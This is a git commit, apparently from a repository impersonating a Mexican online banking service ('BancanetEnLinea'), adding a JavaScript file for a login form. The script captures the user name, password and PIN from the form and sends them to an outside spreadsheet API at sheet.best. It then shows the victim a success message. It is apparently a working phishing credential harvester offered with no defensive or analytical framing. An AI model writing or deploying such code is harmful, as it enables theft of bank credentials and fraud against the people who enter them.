ef1a082ac794e4514a43ce3f12d4cf4842893dc9
BancanetEnLinea <118635290+BancanetEnLinea@users.noreply.github.com>
2022-11-19 14:57:36 -0600

    ad files
    add

---
+++ js/app.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('formulario');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/e2f426d0-4d5e-44fa-a68d-9ee819f686bb', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Contraseña1": formulario.contraseña.value,
+            "Contraseña2": formulario.nip.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
